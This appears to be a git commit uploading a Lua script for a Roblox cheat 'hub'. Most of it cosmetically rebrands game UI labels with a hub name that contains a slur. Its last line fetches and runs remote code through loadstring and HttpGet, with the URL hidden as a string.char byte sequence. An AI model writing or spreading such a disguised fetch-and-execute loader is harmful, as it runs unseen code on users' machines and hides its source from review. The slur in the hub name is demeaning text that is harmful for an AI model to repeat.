7c851ffa04814948b0715bba7db8abf388713a4c
nonamemansd <107858894+nonamemansd@users.noreply.github.com>
2026-02-02 11:13:12 +0200

    Upload Payload_5e4e1d2b.lua

---
+++ Payload_5e4e1d2b.lua
@@ -0,0 +1,35 @@
+
+--[[ STAGE 2: VISUAL CORE ]]
+local HubName = "Rudefags Hub"
+local Acc = Color3.fromRGB(0, 255, 120)
+
+-- // SMART HOOK //
+local function Hook()
+    local function Customize(obj)
+        pcall(function()
+            if obj:IsA("TextLabel") then
+                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
+                    if #obj.Text > 3 and not tonumber(obj.Text) then
+                        obj.Text = HubName
+                        obj.TextColor3 = Acc
+                    end
+                end
+            end
+            if obj:IsA("Frame") or obj:IsA("TextButton") then
+                if obj.BackgroundColor3.R < 0.2 then
+                    if not obj:FindFirstChild("UICorner") then
+                        local uic = Instance.new("UICorner")
+                        uic.CornerRadius = UDim.new(0, 6)
+                        uic.Parent = obj
+                    end
+                end
+            end
+        end)
+    end
+    game.DescendantAdded:Connect(function(c)
+        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
+    end)
+end
+
+Hook()
+loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 97, 109, 97, 122, 105, 110, 103, 103, 111, 108, 100, 54, 57, 47, 70, 108, 105, 99, 107, 47, 109, 97, 105, 110, 47, 70, 108, 105, 99, 107, 46, 108, 117, 97)))()
